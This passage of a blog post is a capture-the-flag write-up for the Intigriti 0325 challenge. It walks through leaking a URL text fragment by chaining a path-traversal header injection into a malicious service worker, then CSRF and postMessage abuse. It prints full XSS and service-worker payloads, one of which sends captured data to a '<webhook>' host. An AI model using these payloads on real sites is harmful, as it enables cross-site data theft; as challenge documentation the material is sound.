+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">visited</span>.<span style="color:#a6e22e">has</span>(<span style="color:#a6e22e">obj</span>)) <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">visited</span>.<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">obj</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">obj</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">currentPath</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">path</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">key</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">key</span>];
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;string&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">value</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;:~:&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Found substring at </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">currentPath</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:`</span>, <span style="color:#a6e22e">value</span>);
+</span></span><span style="display:flex;"><span>      } 
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">value</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;object&#39;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">searchTextFragment</span>(<span style="color:#a6e22e">value</span>, <span style="color:#a6e22e">currentPath</span>, <span style="color:#a6e22e">visited</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">warn</span>(<span style="color:#e6db74">`Could not access property </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">currentPath</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:`</span>, <span style="color:#a6e22e">e</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Let&rsquo;s run it!</p>
+<p><img src="https://gist.github.com/user-attachments/assets/112a0a31-25a9-4031-ac1f-5c9e4cbcbe4c" alt="image">
+(the text fragment can be found somewhere in <code>performance.getEntries()</code> too)</p>
+<p>This approach works in Chrome, but the bot uses Firefox, where it does not work, making the challenge more difficult&hellip;</p>
+
+<h3 id="working-our-way-out">
+  <a class="full-clickable-heading" href="#working-our-way-out">
+    Working our way out
+  </a>
+</h3>
+<p>I spent a long time trying various methods to leak the text fragment. I attempted:</p>
+<ul>
+<li>Sending a fetch request with <code>redirect: manual</code> to capture headers.</li>
+<li>Setting <code>referrer: unsafe-url</code> via <code>meta</code> tag.</li>
+<li>Running the recursive search function on every return value of every function.</li>
+<li>And more…</li>
+</ul>
+<p>None of these methods worked until I considered using a service worker to access the text fragment. I found a related <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1920108">bug report</a>, which encouraged me to not give me.</p>
+<p>Service workers essentially act as proxy servers that sit between web applications, the browser, and the network (when available). They are intended, among other things, to enable the creation of effective offline experiences, intercept network requests, and take appropriate action based on whether the network is available, and update assets residing on the server. They will also allow access to push notifications and background sync APIs.<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
+<p>Although registering a service worker usually requires updating files with arbitrary code (which isn’t directly possible in this challenge), I remembered that the server sends a <code>Cache-Control</code> header (<code>public, max-age=120, immutable</code>) for paths ending in <code>.js</code>. While we can’t upload a JavaScript file, we can abuse the injection in <code>/api/track</code> along with the middleware behavior:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">nextUrl</span>.<span style="color:#a6e22e">pathname</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#39;/view_protected_note&#39;</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">nextUrl</span>.<span style="color:#a6e22e">searchParams</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">note_id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;id&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">uuid_regex</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/^[^\-]{8}-[^\-]{4}-[^\-]{4}-[^\-]{4}-[^\-]{12}$/</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">isMatch</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uuid_regex</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">note_id</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">note_id</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isMatch</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">current_url</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">nextUrl</span>.<span style="color:#a6e22e">clone</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">current_url</span>.<span style="color:#a6e22e">pathname</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/note/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">note_id</span>.<span style="color:#a6e22e">normalize</span>(<span style="color:#e6db74">&#39;NFKC&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">NextResponse</span>.<span style="color:#a6e22e">rewrite</span>(<span style="color:#a6e22e">current_url</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">NextResponse</span>(<span style="color:#e6db74">&#39;Uh oh, Missing or Invalid Note ID :c&#39;</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">status</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">403</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> { <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;text/plain&#39;</span> },
+</span></span><span style="display:flex;"><span>      });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  
+</span></span></code></pre></div><p>By sending a request to <code>https://challenge-0325.intigriti.io/view_protected_note.js?id=../api/a-3f42-4b86-ae89-/../track///</code>, the content of <code>track.js</code> (with its caching headers) is returned. We can then trigger code execution on <code>track.js</code> by sending our payload in the <code>x-user-ip</code> header using <code>fetch</code>.</p>
+<p>A payload sent in the <code>x-user-ip</code> header can, for example, trigger an alert:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#34;</span>}});<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">$</span>(<span style="color:#a6e22e">_</span>){<span style="color:#66d9ef">return</span> {<span style="color:#a6e22e">ready</span><span style="color:#f92672">:</span>(<span style="color:#a6e22e">_</span>)=&gt;{}}};<span style="color:#66d9ef">function</span> document(){};document.<span style="color:#a6e22e">ready</span><span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_</span>){}; <span style="color:#a6e22e">alert</span>() ;(<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">a</span>(){<span style="color:#a6e22e">b</span><span style="color:#f92672">=</span>{<span style="color:#75715e">//
+</span></span></span></code></pre></div><p>Thus, the content of <code>/api/track</code> becomes modified accordingly.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>(document).<span style="color:#a6e22e">ready</span>(<span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">userDetails</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ip</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>}});<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">$</span>(<span style="color:#a6e22e">_</span>){<span style="color:#66d9ef">return</span> {<span style="color:#a6e22e">ready</span><span style="color:#f92672">:</span>(<span style="color:#a6e22e">_</span>)=&gt;{}}};<span style="color:#66d9ef">function</span> document(){};document.<span style="color:#a6e22e">ready</span><span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_</span>){}; <span style="color:#a6e22e">alert</span>() ;(<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">a</span>(){<span style="color:#a6e22e">b</span><span style="color:#f92672">=</span>{<span style="color:#75715e">//&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;client&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">timestamp</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> Date().<span style="color:#a6e22e">toISOString</span>(),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ipDetails</span><span style="color:#f92672">:</span> {}
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">ipAnalytics</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">track</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ip</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">userDetails</span>.<span style="color:#a6e22e">ip</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">timestamp</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> Date().<span style="color:#a6e22e">toISOString</span>(),
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">userDetails</span>.<span style="color:#a6e22e">type</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ipDetails</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">userDetails</span>.<span style="color:#a6e22e">ipDetails</span>
+</span></span><span style="display:flex;"><span>            };
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>I also defined a function called <code>$</code> so that the code does not throw a <code>ReferenceError</code>. This could also be achieved by registering a service worker with <code>type: &quot;module&quot;</code> and importing an external script where <code>$</code> and <code>document</code> are defined. Hoever, this is only feasible in Chromium-based browsers.</p>
+<p>When a service worker is registered, the browser requests the specified script while ignoring the cache. This behavior can be bypassed by specifying <code>updateViaCache: &quot;all&quot;</code> during registration and then calling <code>sw.update()</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Register the service worker
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">serviceWorker</span>.<span style="color:#a6e22e">register</span>(<span style="color:#e6db74">&#34;&lt;target&gt;/view_protected_note.js?id=../api/a-3f42-4b86-ae89-/../track///&#34;</span>, {<span style="color:#a6e22e">updateViaCache</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;all&#39;</span>, <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;module&#34;</span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Reload the cache
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;&lt;target&gt;/view_protected_note.js?id=../api/a-3f42-4b86-ae89-/../track///&#39;</span>, {<span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#39;x-user-ip&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;\&#34;}});function $(_){return {ready:(_)=&gt;{}}};function document(){};document.ready=function(_){};function searchTextFragment(e,t=&#39;root&#39;,n=new Set){if(!n.has(e)){n.add(e);for(const c in e)try{const a=e[c];&#39;string&#39;==typeof a&amp;&amp;a.includes(&#39;:~:&#39;)?fetch(&#39;&lt;webhook&gt;?data=&#39;+encodeURIComponent(a)):a&amp;&amp;&#39;object&#39;==typeof a&amp;&amp;searchTextFragment(a,t,n)}catch(e){}}}self.addEventListener(&#39;fetch&#39;,(e=&gt;{searchTextFragment(e),e.clientId&amp;&amp;self.clients.get(e.clientId).then((e=&gt;{e&amp;&amp;searchTextFragment(e)}))}));(function a(){b={//&#34;</span>}, <span style="color:#a6e22e">cache</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;reload&#39;</span>});
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Update the service worker code
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">update</span>()
+</span></span></code></pre></div><div class="notice note" >
+    <p class="notice-title">
+        <span class="icon-notice baseline">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 128 300 300">
+  <path d="M150 128c82.813 0 150 67.188 150 150 0 82.813-67.188 150-150 150C67.187 428 0 360.812 0 278c0-82.813 67.188-150 150-150Zm25 243.555v-37.11c0-3.515-2.734-6.445-6.055-6.445h-37.5c-3.515 0-6.445 2.93-6.445 6.445v37.11c0 3.515 2.93 6.445 6.445 6.445h37.5c3.32 0 6.055-2.93 6.055-6.445Zm-.39-67.188 3.515-121.289c0-1.367-.586-2.734-1.953-3.516-1.172-.976-2.93-1.562-4.688-1.562h-42.968c-1.758 0-3.516.586-4.688 1.563-1.367.78-1.953 2.148-1.953 3.515l3.32 121.29c0 2.734 2.93 4.882 6.64 4.882h36.134c3.515 0 6.445-2.148 6.64-4.883Z"/>
+</svg>
+
+        </span>Note</p><p>By using the path <code>/view_protected_note.js</code>, the service worker’s scope will be <code>/</code>. If the script were located at <code>/view_protected_note/test.js</code>, the scope would differ.</p></div>
+
+<p>We&rsquo;re almost there. For some reason if the text fragment is present in <code>location.href</code>, it&rsquo;s removed and the page reloads. To avoid this, we can use <code>window.stop()</code> followed by <code>window.location.reload()</code>, which triggers a request, which will be intercepted by the service worker, ensuring that the text fragment remains in the request URL.</p>
+<p>Here is the payload used to leak the text fragment:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">urlParams</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">serviceWorker</span>.<span style="color:#a6e22e">getRegistration</span>())) <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">stop</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">urlParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;done&#34;</span>)){
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">stop</span>()
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">setTimeout</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">pathname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?done=1&#34;</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    }, <span style="color:#ae81ff">2000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">stop</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">reload</span>()
+</span></span><span style="display:flex;"><span>    }, <span style="color:#ae81ff">2000</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>})();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">serviceWorker</span>.<span style="color:#a6e22e">register</span>(<span style="color:#e6db74">&#39;&lt;target&gt;/view_protected_note.js?id=../api/a-3f42-4b86-ae89-/../track///&#39;</span>, {<span style="color:#a6e22e">updateViaCache</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;all&#39;</span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;&lt;target&gt;/view_protected_note.js?id=../api/a-3f42-4b86-ae89-/../track///&#39;</span>, {<span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#39;x-user-ip&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;\&#34;}});function $(_){return {ready:(_)=&gt;{}}};function document(){};document.ready=function(_){};function searchTextFragment(e,t=&#39;root&#39;,n=new Set){if(!n.has(e)){n.add(e);for(const c in e)try{const a=e[c];&#39;string&#39;==typeof a&amp;&amp;a.includes(&#39;:~:&#39;)?fetch(&#39;&lt;webhook&gt;?data=&#39;+encodeURIComponent(a)):a&amp;&amp;&#39;object&#39;==typeof a&amp;&amp;searchTextFragment(a,t,n)}catch(e){}}}self.addEventListener(&#39;fetch&#39;,(e=&gt;{searchTextFragment(e),e.clientId&amp;&amp;self.clients.get(e.clientId).then((e=&gt;{e&amp;&amp;searchTextFragment(e)}))}));(function a(){b={//&#34;</span>}, <span style="color:#a6e22e">cache</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;reload&#39;</span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">update</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">pathname</span>;
+</span></span><span style="display:flex;"><span>    }, <span style="color:#ae81ff">5000</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>})()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>There&rsquo;s one crucial step remaining: we only have self-XSS, so we need a method to escalate this vulnerability into something truly useful. The server lacks CSRF protection, which offers a potential path forward.</p>
+
+<h3 id="csrf--json">
+  <a class="full-clickable-heading" href="#csrf--json">
+    CSRF &amp; JSON
+  </a>
+</h3>
+<p>This is not a major obstacle because the server improperly checks for the correct content type.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">content_type</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">content_type</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#39;application/json&#39;</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Invalid content type&#39;</span> });
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If a POST request is sent without a <code>Content-Type</code> header, the check is bypassed. I didn&rsquo;t know this was possible until I read <a href="https://nastystereo.com/security/cross-site-post-without-content-type.html">this blog post</a>. Basically, it&rsquo;s possible to pass a <code>Blob</code> instead of a string in the body parameter, which results in no <code>Content-Type</code> header being sent. An example of this CSRF technique is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">TARGET</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/api/post`</span>, {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Blob</span>([
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#e6db74">&#34;title&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`Hello World`</span>, <span style="color:#e6db74">&#34;content&#34;</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">payload</span>] })
+</span></span><span style="display:flex;"><span>    ]),
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;include&#34;</span>
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>One last challenge is letting the bot visit a note without knowing its ID. This is where the event listener in <code>/protected-note</code> becomes critical. Reviewing that event listener reveals that by sending a message with type <code>&quot;success&quot;</code> and an empty password, the note ID is returned (since the default password for protected notes is empty)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">useEffect</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(window.<span style="color:#a6e22e">opener</span>){
+</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">opener</span>.<span style="color:#a6e22e">postMessage</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;childLoaded&#34;</span> }, <span style="color:#e6db74">&#34;*&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setisMounted</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">handleMessage</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">event</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;submitPassword&#34;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">validatepassword</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">password</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#a6e22e">handleMessage</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> () =&gt; window.<span style="color:#a6e22e">removeEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#a6e22e">handleMessage</span>);
+</span></span><span style="display:flex;"><span>}, []);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">validatepassword</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">submittedpassword</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">notes</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#34;notes&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;[]&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">foundNote</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">notes</span>.<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">note</span> =&gt; <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">password</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">submittedpassword</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;NOTES&#34;</span>, <span style="color:#a6e22e">notes</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">foundNote</span>, <span style="color:#a6e22e">submittedpassword</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">foundNote</span>) {
